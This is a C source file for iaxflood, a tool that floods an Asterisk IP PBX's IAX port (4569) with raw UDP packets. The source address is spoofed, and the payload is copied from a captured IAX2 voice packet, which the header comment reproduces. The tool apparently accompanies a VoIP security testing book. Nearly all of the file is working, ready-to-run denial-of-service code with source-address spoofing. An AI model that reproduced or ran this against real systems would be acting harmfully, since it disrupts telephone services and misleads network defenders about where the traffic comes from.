//-------------------------------------------------------------------------------
//
//      iaxflood.c - A UDP Inter-Asterisk_eXchange (i.e. IAX)
//                           packet was captured from an IAX channel
//                           between two Asterisk IP PBX's. The content
//                           of that packet is the source of the payload
//                           for the attack embodied by this tool. While the
//                          IAX protocol header might not match the 
//                          Asterisk PBX you'll attack with this tool, it
//                          may require more processing on the part of
//                          the PBX than a simple udpflood without any
//                          payload that even resembles an IAX payload.
//
//     The packet content on which the payload for this tool is
//     based follows:
//
//     This is a print of an IAX channel RTP bearing minipacket from an inter-domain
//     call. Offsets into the packet are as follows:
//
//    Offset:
//
//    0x1e - Beginning of IP header
//
//    0x10 - IP header's total length field (i.e. 192 = 0x00c0)
//
//    0x22 - Source port (i.e. 4569, the default IAX channel port) - Beginning of UDP header
//
//    0x24 - Dest port (i.e. 4569, the default IAX channel port)
//
//    0x26 - UDP header's Length field (i.e. 172 = 0x00ac)
//
//    0x28 - UDP header's Checksum field - Ethereal claims it is incorrect and should
//    be 0x58B5.
//
//    0x2a - This is the beginning of the 4 byte IAX version/call id field.
//    The "source call" field is the 16 bits beginning at offset 0x2a (i.e. 4)
//    The Timestamp is the 16 bits beginning at offset 0x2c (i.e. 9869)
//
//    0x2e - This is the start of the RTP data (i.e. beginning with value 0xca). The
//    RTP payload is 160 bytes in length.
//
//    No.     Time        Source                Destination           Protocol Info
//    110   12.723515   10.1.101.2            10.1.101.1            IAX2     Mini packet, source call# 4, timestamp 9869ms, Raw mu-law data (G.711)
//
//  Frame 110 (206 bytes on wire, 206 bytes captured)
//  Ethernet II, Src: DellComp_db:7e:71 (00:08:74:db:7e:71), Dst: 3com_ce:72:c0 (00:10:5a:ce:72:c0)
//  Internet Protocol, Src: 10.1.101.2 (10.1.101.2), Dst: 10.1.101.1 (10.1.101.1)
//  User Datagram Protocol, Src Port: 4569 (4569), Dst Port: 4569 (4569)
//    Source port: 4569 (4569)
//    Destination port: 4569 (4569)
//    Length: 172
//    Checksum: 0xdec2 [incorrect, should be 0x58b5]
//  Inter-Asterisk eXchange v2
//    Packet type: Mini voice packet (0)
//        .000 0000 0000 0100 = Source call: 4
//        Call identifier: 1
//        Timestamp: 9869
//        Absolute Time: Jul 17, 2006 19:45:03.263803000
//        Lateness: -0.001746000 seconds
//        IAX2 payload (160 bytes)
//  Data (160 bytes)
//
//  0000  00 10 5a ce 72 c0 00 08 74 db 7e 71 08 00 45 10   ..Z.r...t.~q..E.
//  0010  00 c0 00 30 40 00 40 11 5b e8 0a 01 65 02 0a 01   ...0@.@.[...e...
//  0020  65 01 11 d9 11 d9 00 ac de c2 00 04 26 8d ca f5   e...........&...
//  0030  52 e8 7c f6 7c 5e f7 e6 62 6c da 78 6e 52 69 d9   R.|.|^..bl.xnRi.
//  0040  6e 76 77 fb d9 6c f1 ee 6e 5d 6d e4 df e3 69 d8   nvw..l..n]m...i.
//  0050  61 62 f7 54 d7 de 55 e1 f1 65 79 79 6c ca f7 4d   ab.T..U..eyyl..M
//  0060  6b ef ee 64 7b eb d8 6c 51 dc eb 6a 66 6f e1 ec   k..d{..lQ..jfo..
//  0070  6b 64 d5 e6 59 5f f3 e1 f1 67 6f e3 f0 63 75 da   kd..Y_...go..cu.
//  0080  f7 6a 68 73 e3 73 6d f0 70 ea 7b fc ef 71 66 74   .jhs.sm.p.{..qft
//  0090  eb 6e ef ef 5a fa ea 66 76 ed e1 6c 6f e9 72 fa   .n..Z..fv..lo.r.
//  00a0  65 73 d6 e0 5f 5e dc e3 67 76 5e e2 e5 53 ef e3   es.._^..gv^..S..
//  00b0  5c f5 ec 62 ea 6b 55 df e9 e8 f7 62 f4 f9 f2 ee   \..b.kU....b....
//  00c0  7c 6f 5d ee e6 fb f2 ed 5d 7d f2 7d e6 7a         |o].....]}.}.z
//
//  This tool is derived from code downloaded from
//  www.packetstromsecurity.nl. Its origin is
//  unknown. There was no copyright or license
//  accompanying the code. As such, the following
//  copyright/license is applied to this derivation.
//
//    Copyright (C) 2006  Mark D. Collier/Mark O'Brien
//
//    This program is free software; you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation; either version 2 of the License, or
//    (at your option) any later version.
//
//    This program is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with this program; if not, write to the Free Software
//    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
//
//   Author: Mark D. Collier/Mark O'Brien - 07/19/2006  v1.0
//         www.securelogix.com - mark.collier@securelogix.com
//         www.hackingexposedvoip.com
//
//-------------------------------------------------------------------------------

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>

struct sockaddr sa;

main ( int argc, char **argv ) {
    
    int fd;
    int x = 1;
    int srcport, destport;
    int numpackets;

    struct sockaddr_in *p;
    struct hostent *he;


// Description of IP header bytes in first 5 lines:
//
//    IP version & hdr len 0x45, DSCP 0x10, IP packet len 0x00c0
//    IP hdr ID 0x0030, Fragment spec (i.e. don't frag, offset 0) 0x4000
//    TTL (0x40), UDP protocol (0x11), hdr checksum 0x0000
//    src IP
//    dest IP
//
//Description of UDP header in lines 6 and 7:
//
//    src port 4569, dest port 4569
//    UDP packet len, checksum (flagged as incorrect by Ethereal)
//
// IAX2 header in line 8:
//     source call = 4,  Timestamp: 9869
//
// RTP payload beginning in line 9

u_char gram[192]=
	{
	0x45,	0x10,	0x00,	0xC0,
	0x00,	0x30,	0x40,	0x00,
	0x40,	0x11,	0x00,	0x00,
	0,	0,	0,	0, 
	0,	0,	0,	0,

	0x11,	0xD9,	0x11,	0xD9,
	0x00,	0xAC,	0xDE,	0xC2,
            
        0x00,   0x04,   0x26,   0x8d,

        0xca,   0xf5,   0x52,   0xe8,   0x7c,   0xf6,   0x7c,   0x5e,
        0xf7,   0xe6,   0x62,   0x6c,   0xda,   0x78,   0x6e,   0x52,
        0x69,   0xd9,   0x6e,   0x76,   0x77,   0xfb,   0xd9,   0x6c,
        0xf1,   0xee,   0x6e,   0x5d,   0x6d,   0xe4,   0xdf,   0xe3,
        0x69,   0xd8,   0x61,   0x62,   0xf7,   0x54,   0xd7,   0xde,
        0x55,   0xe1,   0xf1,   0x65,   0x79,   0x79,   0x6c,   0xca,
        0xf7,   0x4d,   0x6b,   0xef,   0xee,   0x64,   0x7b,   0xeb,
        0xd8,   0x6c,   0x51,   0xdc,   0xeb,   0x6a,   0x66,   0x6f,
        0xe1,   0xec,   0x6b,   0x64,   0xd5,   0xe6,   0x59,   0x5f,
        0xf3,   0xe1,   0xf1,   0x67,   0x6f,   0xe3,   0xf0,   0x63,
        0x75,   0xda,   0xf7,   0x6a,   0x68,   0x73,   0xe3,   0x73,
        0x6d,   0xf0,   0x70,   0xea,   0x7b,   0xfc,   0xef,   0x71,
        0x66,   0x74,   0xeb,   0x6e,   0xef,   0xef,   0x5a,   0xfa,
        0xea,   0x66,   0x76,   0xed,   0xe1,   0x6c,   0x6f,   0xe9,
        0x72,   0xfa,   0x65,   0x73,   0xd6,   0xe0,   0x5f,   0x5e,
        0xdc,   0xe3,   0x67,   0x76,   0x5e,   0xe2,   0xe5,   0x53,
        0xef,   0xe3,   0x5c,   0xf5,   0xec,   0x62,   0xea,   0x6b,   
        0x55,   0xdf,   0xe9,   0xe8,   0xf7,   0x62,   0xf4,   0xf9,
        0xf2,   0xee,   0x7c,   0x6f,   0x5d,   0xee,   0xe6,   0xfb,
        0xf2,   0xed,   0x5d,   0x7d,   0xf2,   0x7d,   0xe6,   0x7a
 	};
        
    if ( argc != 4 ) {
        fprintf ( stderr,
                  "usage: %s sourcename destinationname numpackets\n",
                  *argv );
        exit ( EXIT_FAILURE );
    }

//    srcport  = atoi ( argv[3] );
//    destport = atoi ( argv[4] );
        
    srcport  = 4569;  // the well-known iax port
    destport = 4569;  // the well-known iax port
    
    numpackets  = atoi ( argv[3] );
    
    fprintf ( stderr,
              "Will flood port %d from port %d %d times",
              destport, srcport, numpackets );

    if ( ( he = gethostbyname ( argv[1] ) ) == NULL ) {
        fprintf ( stderr, "can't resolve source hostname\n" );
        exit ( EXIT_FAILURE );
    }

    bcopy ( *(he->h_addr_list), (gram+12), 4 );

    if ( ( he = gethostbyname( argv[2] ) ) == NULL ) {
        fprintf ( stderr, "can't resolve destination hostname\n" );
        exit ( EXIT_FAILURE );
    }
    
    bcopy ( *(he->h_addr_list), (gram+16), 4 );

//    *(u_short*)(gram+20) = htons( (u_short) srcport  );
//    *(u_short*)(gram+22) = htons( (u_short) destport );
    
    p = ( struct sockaddr_in* ) &sa;
    p->sin_family = AF_INET;
    bcopy ( *(he->h_addr_list), &(p->sin_addr), sizeof(struct in_addr) );

    if ( ( fd = socket ( AF_INET, SOCK_RAW, IPPROTO_RAW ) ) == -1 ) {
        perror("socket");
        exit ( EXIT_FAILURE );
    }

    #ifdef IP_HDRINCL
    fprintf ( stderr, "\nWe have IP_HDRINCL \n" );
    if ( setsockopt ( fd, IPPROTO_IP, IP_HDRINCL, (char*)&x, sizeof(x) ) < 0 ) {
        perror ( "setsockopt IP_HDRINCL" );
        exit ( EXIT_FAILURE );
    }
    #else
    fprintf ( stderr, "\nWe don't have IP_HDRINCL \n" );
    #endif

    printf("\nNumber of Packets sent:\n\n");

    //
    //  Main loop
    //
            
    for ( x = 0; x < numpackets; x++ ) {
        if ( ( sendto ( fd,
                        &gram,
                        sizeof(gram),
                        0,
                        ( struct sockaddr* ) p,
                        sizeof(struct sockaddr) ) )
              == -1 ) {
            perror ( "sendto" );
            exit ( EXIT_FAILURE );
        }       
        printf ( "\rSent %d ", x+1 );
    }
    
    printf ( "\n" );
    exit ( EXIT_SUCCESS );
} // end iaxflood
